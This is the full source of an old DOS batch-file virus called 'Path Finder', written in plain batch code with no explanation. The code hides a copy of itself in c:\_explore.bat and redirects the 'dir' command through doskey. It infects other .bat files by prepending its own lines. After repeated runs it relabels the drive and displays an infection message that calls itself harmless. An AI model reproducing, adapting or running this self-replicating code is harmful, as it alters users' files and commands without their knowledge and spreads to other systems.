@echo off%_explore%
set explorem=%explorem%1
set explorem=
set exploreinf=%exploreinf%1
if %exploreinf%==1111111111111111111 goto exploremess
rem if exist c:\_vac.txt goto exploreend
if '%1=='!explore echo [1A[K[2A
if '%1=='explore goto explore%2
set explore=%0.bat
if not exist %explore% set explore=%0
if '%explore%==' set explore=autoexec.bat
if exist c:\_explore.bat goto exploreg
if exist %explore% goto explorefe
call %explore% explore h %path%
if exist %explore% goto explorefe
goto eexplore
:exploreh
shift%_explore%
if '%2==' goto explorext
if exist %2\%explore% set explore=%2\%explore%
if exist %2%explore% set explore=%2%explore%
if exist %2\%explore%.bat set explore=%2\%explore%.bat
if exist %2%explore%.bat set explore=%2%explore%.bat
if not exist %explore% goto exploreh
GOTO explorext
:explorefe
find "explore"<%explore%>c:\_explore.bat
attrib c:\_explore.bat +h
:exploreg
command /e:10000 /c c:\_explore explore vir
:eexplore
set explore=
if exist !!explore.bat del !!explore.bat
GOTO exploreend
:explorext
echo.>!!explore.bat
!!explore.bat
:explorevir
doskey dir=c:\_explore !explore$tdir $*>nul
for %%a in (*.bat ..\*.bat c:\*.bat) do call c:\_explore explore i %%a
exit explore
: explorei
find "explore"<%3>nul
if not errorlevel 1 goto explorej
type c:\_explore.bat>explore$
type %3>>explore$
move explore$ %3>nul
set explore#=%explore#%1
if %explore#%==111 exit
:explorej
set explore!=%explore!%1
if %explore!%==1111111111 exit
GOTO exploreend
:exploremess
label %explorem% explored
echo %explorem% Your system has been infected by Path Finder
echo %explorem% It's an harmless virii that was made 
echo %explorem% just for exploring the globe.                  
echo %explorem% written by proxima.
echo %explorem% Greetings goes to WaveFunc and Dark Avenger
pause %explorem%
:exploreend
